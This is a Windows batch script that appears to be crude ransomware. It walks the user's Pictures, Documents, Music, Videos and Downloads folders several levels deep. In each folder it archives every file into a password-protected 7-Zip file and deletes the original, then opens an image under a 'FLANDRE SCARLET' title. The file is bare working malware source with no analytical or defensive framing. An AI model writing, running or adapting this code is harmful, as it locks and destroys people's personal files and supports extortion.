@echo off
color 4
title FLANDRE SCARLET!!!
cd C:\Users\%username%\Pictures
for /d %%b in (*) do (
    cd %%b
    for /d %%c in (*) do (
        cd %%c
        for /d %%d in (*) do (
            cd %%d
            for /d %%e in (*) do (
                cd %%e
                for /d %%f in (*) do (
                    cd %%f
                    for /d %%g in (*) do (
                        cd %%g
                        for /d %%h in (*) do (
                            cd %%h
                            call :enc
                        )
                        call :enc
                    )
                    call :enc
                )
                call :enc
            )
            call :enc
        )
        call :enc
    )
    call :enc
)

cd C:\Users\%username%\Documents 
for /d %%b in (*) do (
    cd %%b
    for /d %%c in (*) do (
        cd %%c
        for /d %%d in (*) do (
            cd %%d
            for /d %%e in (*) do (
                cd %%e
                for /d %%f in (*) do (
                    cd %%f
                    for /d %%g in (*) do (
                        cd %%g
                        for /d %%h in (*) do (
                            cd %%h
                            call :enc
                        )
                        call :enc
                    )
                    call :enc
                )
                call :enc
            )
            call :enc
        )
        call :enc
    )
    call :enc
)

cd C:\Users\%username%\Music
for /d %%b in (*) do (
    cd %%b
    for /d %%c in (*) do (
        cd %%c
        for /d %%d in (*) do (
            cd %%d
            for /d %%e in (*) do (
                cd %%e
                for /d %%f in (*) do (
                    cd %%f
                    for /d %%g in (*) do (
                        cd %%g
                        for /d %%h in (*) do (
                            cd %%h
                            call :enc
                        )
                        call :enc
                    )
                    call :enc
                )
                call :enc
            )
            call :enc
        )
        call :enc
    )
    call :enc
)

cd C:\Users\%username%\Videos
for /d %%b in (*) do (
    cd %%b
    for /d %%c in (*) do (
        cd %%c
        for /d %%d in (*) do (
            cd %%d
            for /d %%e in (*) do (
                cd %%e
                for /d %%f in (*) do (
                    cd %%f
                    for /d %%g in (*) do (
                        cd %%g
                        for /d %%h in (*) do (
                            cd %%h
                            call :enc
                        )
                        call :enc
                    )
                    call :enc
                )
                call :enc
            )
            call :enc
        )
        call :enc
    )
    call :enc
)

cd C:\Users\%username%\Downloads
for /d %%b in (*) do (
    cd %%b
    for /d %%c in (*) do (
        cd %%c
        for /d %%d in (*) do (
            cd %%d
            for /d %%e in (*) do (
                cd %%e
                for /d %%f in (*) do (
                    cd %%f
                    for /d %%g in (*) do (
                        cd %%g
                        for /d %%h in (*) do (
                            cd %%h
                            call :enc
                        )
                        call :enc
                    )
                    call :enc
                )
                call :enc
            )
            call :enc
        )
        call :enc
    )
    call :enc
)
:enc
    for %%a in (*) do (echo Grizlik:DRansomware| "C:\Program Files\7-Zip\7z.exe" a -p "%%a.7z" "%%a" & del "%%a")
    cd..
goto :eof
cd C:\Users\%username%\Desktop\FLANDRESCARLET
start F.png
pause
exit